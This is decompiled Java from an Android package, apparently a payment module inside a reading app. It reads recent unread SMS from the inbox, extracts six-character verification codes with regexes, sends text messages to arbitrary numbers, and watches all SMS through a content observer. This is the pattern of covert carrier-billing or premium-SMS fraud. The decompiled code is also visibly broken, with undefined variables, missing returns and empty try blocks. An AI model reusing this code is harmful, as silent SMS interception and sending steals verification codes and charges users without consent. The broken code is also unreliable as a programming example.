package com.clilystudio.netbook.hpay100.c;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public final class b {

    private static com.clilystudio.netbook.hpay100.config.b a = null;

    public static int a(Context Context1) {
        int int3;

        try {
            TelephonyManager TelephonyManager4 = (TelephonyManager) Context1.getSystemService("phone");
        } catch (Exception Exception2) {
            Exception2.printStackTrace();
        }
        int3 = -1;
        return int3;
    }

    public static String a(Context Context1, String String2) {
        Cursor Cursor4;
        String String7;

        try {
            Uri Uri9 = Uri.parse("content://sms/inbox");
            String[] String_1darray10 = {"_id", "address", "read", "body"};
            Cursor Cursor11 = Context1.getContentResolver().query(Uri9, String_1darray10, new StringBuilder("read = 0  and date > ").append(System.currentTimeMillis() - 1800000L).toString(), null, "_id desc");
        } catch (Exception Exception6) {
            Cursor4 = null;
            try {
                Exception6.printStackTrace();
            } finally {
                if (Cursor4 != null) {
                    try {
                        Cursor4.close();
                    } catch (Exception Exception5) {
                        Exception5.printStackTrace();
                    }
                }
                throw Object3;
            }
            String7 = "";
            if (Cursor4 != null) {
                try {
                    Cursor4.close();
                } catch (Exception Exception8) {
                    Exception8.printStackTrace();
                }
            }
        } finally {
            Cursor4 = null;
            if (Cursor4 != null)
                Cursor4.close();
            throw Object3;
        }
        com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("smsYzm:").append(String7).toString());
        return String7;
    }

    private static String a(String String1, int int2) {
        String String4;
        Matcher Matcher6;

        try {
            Matcher6 = Pattern.compile(new StringBuilder("(?<![0-9a-zA-Z])([0-9a-zA-Z]{6").append("})(?![0-9a-zA-Z])").toString()).matcher((CharSequence) String1);
        } catch (Exception Exception3) {
            Exception Exception5;

            String4 = "";
            Exception5 = Exception3;
            Exception5.printStackTrace();
            return String4;
        }
        String4 = "";
        for (; ; ) {
            String String7;

            try {
                if (!Matcher6.find())
                    return String4;
            } catch (Exception Exception8) {
                Exception8.printStackTrace();
                return String4;
            }
            try {
                String7 = Matcher6.group();
            } catch (Exception Exception9) {
                Exception9.printStackTrace();
                return String4;
            }
            String4 = String7;
        }
        return String4;
    }

    public static void a(String String1, String String2) {
        SmsManager SmsManager4;

        label_55:
        {
            if (!android.text.TextUtils.isEmpty((CharSequence) String1) && !android.text.TextUtils.isEmpty((CharSequence) String2)) {
                try {
                    Iterator Iterator5;

                    SmsManager4 = SmsManager.getDefault();
                    if (String2.length() <= 70)
                        break label_55;
                    Iterator5 = SmsManager4.divideMessage(String2).iterator();
                    while (Iterator5.hasNext()) {
                        String String6 = (String) Iterator5.next();

                        SmsManager4.sendTextMessage(String1, null, String6, null, null);
                        com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("sms address:").append(String1).toString());
                        com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("sms content:").append(String6).toString());
                    }
                } catch (Exception Exception3) {
                    Exception3.printStackTrace();
                    return;
                }
            }
            return;
        }
        try {
            SmsManager4.sendTextMessage(String1, null, String2, null, null);
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("sms address--:").append(String1).toString());
            com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("sms content--:").append(String2).toString());
        } catch (Exception Exception7) {
            Exception7.printStackTrace();
            return;
        }
    }

    public static boolean a(String String1) {
        if (TextUtils.isEmpty((CharSequence) String1) || String1.length() != 11)
            return false;
        else {
            boolean boolean3;

            try {
                boolean3 = Pattern.compile("^((13\\d)|14[5,7]|(15[\\d&&[^4]])|17[0,6,7,8]|(18\\d))\\d{8}$").matcher((CharSequence) String1).matches();
            } catch (Exception Exception2) {
                Exception2.printStackTrace();
                return false;
            }
            return boolean3;
        }
    }

    public static String b(String String1) {
        String String3;

        label_48:
        {
            label_39:
            {
                try {
                    int int4;
                    String String5;

                    if (TextUtils.isEmpty((CharSequence) String1) || String1.length() < 11)
                        break label_48;
                    int4 = String1.indexOf("1");
                    String3 = String1.substring(int4, int4 + 11);
                    if (!String3.startsWith("+86"))
                        break label_39;
                    String5 = String3.substring(3);
                } catch (Exception Exception2) {
                    Exception2.printStackTrace();
                    String3 = "";
                }
                com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("getProcessPhone:").append(String3).toString());
                return String3;
            }
            try {
                if (String3.startsWith("86"))
                    String3 = String3.substring(2);
            } catch (Exception Exception6) {
                Exception6.printStackTrace();
                String3 = "";
            }
        }
        String3 = "";
    }

    public static String b(String String1, String String2) {
        String String4;

        label_37:
        {
            Matcher Matcher8;

            label_19:
            {
                try {
                    Pattern Pattern7;

                    com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("yzm regx:").append(String2).toString());
                    if (!android.text.TextUtils.isEmpty((CharSequence) String2))
                        break label_37;
                    Pattern7 = Pattern.compile("(?<![0-9a-zA-Z])([0-9a-zA-Z]{6})(?![0-9a-zA-Z])");
                    Matcher8 = Pattern7.matcher((CharSequence) String1);
                    break label_19;
                } catch (Exception Exception3) {
                    Exception Exception5;

                    String4 = "";
                    Exception5 = Exception3;
                    Exception5.printStackTrace();
                }
                com.clilystudio.netbook.hpay100.a.a.b("dalongTest", new StringBuilder("dynamicPassword:").append(String4).toString());
                return String4;
            }
            String4 = "";
            for (; ; ) {
                try {
                    boolean boolean9 = Matcher8.find();
                } catch (Exception Exception11) {
                    Exception11.printStackTrace();
                    break;
                }
                break;
            }
        }
        try {
            Pattern Pattern6 = Pattern.compile(String2);
        } catch (Exception Exception12) {
            String4 = "";
            Exception11 = Exception12;
            Exception11.printStackTrace();
        }
    }

    public static boolean b(Context Context1) {
        if (1 == a(Context1))
            return true;
        else
            return false;
    }

    public static boolean c(Context Context1) {
        if (Context1 == null || Context1.checkCallingOrSelfPermission("android.permission.SEND_SMS") != 0)
            return false;
        else {
            switch (((TelephonyManager) Context1.getSystemService("phone")).getSimState()) {
                default:
                    return false;
                case 1:
                case 2:
                case 3:
                case 4:
                case 0:
                    return false;
                case 5:
                    return true;
            }
        }
    }

    public static void d(Context Context1) {
        try {
            Uri Uri3;

            a = new com.clilystudio.netbook.hpay100.config.b(new Handler(), Context1);
            Uri3 = Uri.parse("content://sms");
            Context1.getApplicationContext().getContentResolver().registerContentObserver(Uri3, true, (ContentObserver) a);
        } catch (Exception Exception2) {
            Exception2.printStackTrace();
            return;
        }
    }
}
